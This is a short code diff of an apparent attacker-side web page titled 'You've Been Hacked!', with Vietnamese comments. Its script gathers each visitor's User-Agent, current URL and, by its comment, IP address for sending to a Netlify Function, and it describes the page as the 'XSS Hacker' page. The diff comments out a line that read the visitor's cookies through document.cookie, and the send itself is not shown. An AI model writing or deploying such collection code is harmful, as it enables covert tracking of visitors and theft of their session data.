@@ -3,12 +3,12 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Alert: You've Been Hacked bởi 4 chị em!</title>
+    <title>Alert: You've Been Hacked!</title>
     <link rel="stylesheet" href="style.css" />
     <script>
       // Hàm gửi thông tin về User-Agent, IP và URL gốc tới Netlify Function
       function sendDataToNetlify() {
-        var cookies = document.cookie; // Lấy cookies của người dùng
+        // var cookies = document.cookie; // Lấy cookies của người dùng
         var currentUrl = window.location.href; // Lấy URL hiện tại (URL của trang XSS Hacker)
         var userAgent = navigator.userAgent; // Lấy User-Agent của trình duyệt
 
